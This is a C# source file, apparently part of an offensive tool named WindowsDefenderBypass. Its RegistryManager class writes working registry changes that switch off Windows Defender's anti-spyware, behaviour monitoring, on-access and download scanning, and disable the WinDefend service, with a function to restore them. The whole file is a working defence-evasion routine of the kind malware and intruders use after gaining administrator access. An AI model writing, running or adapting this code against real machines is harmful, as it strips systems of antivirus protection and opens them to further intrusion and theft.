using System;
using Microsoft.Win32;

namespace WindowsDefenderBypass
{
    public static class RegistryManager
    {
        private const string DefenderPolicyPath = @"SOFTWARE\Policies\Microsoft\Windows Defender";
        private const string RealTimeProtectionPath = @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";

        public static void DisableDefenderViaRegistry()
        {
            try
            {
                Registry.SetValue($@"HKEY_LOCAL_MACHINE\{DefenderPolicyPath}", "DisableAntiSpyware", 1, RegistryValueKind.DWord);
                Console.WriteLine("  [+] Set DisableAntiSpyware = 1");

                RegistryKey realTimeKey = Registry.LocalMachine.CreateSubKey(RealTimeProtectionPath, true);
                if (realTimeKey != null)
                {
                    realTimeKey.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
                    Console.WriteLine("  [+] Set DisableBehaviorMonitoring = 1");

                    realTimeKey.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
                    Console.WriteLine("  [+] Set DisableOnAccessProtection = 1");

                    realTimeKey.SetValue("DisableScanOnRealtimeEnable", 1, RegistryValueKind.DWord);
                    Console.WriteLine("  [+] Set DisableScanOnRealtimeEnable = 1");

                    realTimeKey.SetValue("DisableRawWriteNotification", 1, RegistryValueKind.DWord);
                    Console.WriteLine("  [+] Set DisableRawWriteNotification = 1");

                    realTimeKey.SetValue("DisableIOAVProtection", 1, RegistryValueKind.DWord);
                    Console.WriteLine("  [+] Set DisableIOAVProtection = 1");

                    realTimeKey.Close();
                }

                RegistryKey serviceKey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\WinDefend", true);
                if (serviceKey != null)
                {
                    serviceKey.SetValue("Start", 4, RegistryValueKind.DWord);
                    Console.WriteLine("  [+] Disabled WinDefend service");
                    serviceKey.Close();
                }
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("  [!] Access denied to registry. Ensure running as administrator.");
                throw;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"  [!] Registry error: {ex.Message}");
                throw;
            }
        }

        public static void RestoreDefenderViaRegistry()
        {
            try
            {
                Registry.SetValue($@"HKEY_LOCAL_MACHINE\{DefenderPolicyPath}", "DisableAntiSpyware", 0, RegistryValueKind.DWord);
                Console.WriteLine("  [+] Restored DisableAntiSpyware = 0");

                RegistryKey realTimeKey = Registry.LocalMachine.OpenSubKey(RealTimeProtectionPath, true);
                if (realTimeKey != null)
                {
                    realTimeKey.SetValue("DisableBehaviorMonitoring", 0, RegistryValueKind.DWord);
                    realTimeKey.SetValue("DisableOnAccessProtection", 0, RegistryValueKind.DWord);
                    realTimeKey.SetValue("DisableScanOnRealtimeEnable", 0, RegistryValueKind.DWord);
                    realTimeKey.SetValue("DisableRawWriteNotification", 0, RegistryValueKind.DWord);
                    realTimeKey.SetValue("DisableIOAVProtection", 0, RegistryValueKind.DWord);
                    Console.WriteLine("  [+] Restored Real-Time Protection settings");
                    realTimeKey.Close();
                }

                RegistryKey serviceKey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\WinDefend", true);
                if (serviceKey != null)
                {
                    serviceKey.SetValue("Start", 2, RegistryValueKind.DWord);
                    Console.WriteLine("  [+] Re-enabled WinDefend service");
                    serviceKey.Close();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"  [!] Error restoring registry: {ex.Message}");
            }
        }
    }
}
